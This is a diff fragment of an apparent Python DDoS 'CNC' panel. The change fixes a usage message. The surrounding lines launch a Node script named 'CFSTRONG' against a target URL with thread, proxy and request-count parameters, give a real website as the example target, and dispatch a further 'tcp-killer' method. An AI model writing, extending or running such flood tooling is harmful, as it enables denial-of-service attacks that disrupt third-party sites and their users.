@@ -224,7 +224,7 @@ def main():
                 os.system(f'node CFSTRONG.js {url} {time} {threads} {method} {proxy} {requests}')
             except IndexError:
                 print('Usage: CFSTRONG https://yandex.com/ 120 15000 GET/POST proxies.txt 500')
-                print('Example: CFSTRONG <url> <time> <threads> <methode> <proxy> <request>')
+                print('Example: CFSTRONG <url> <time> <threads> <methode> <proxy> <requests>')
         
         elif "tcp-killer" in cnc:
             try:
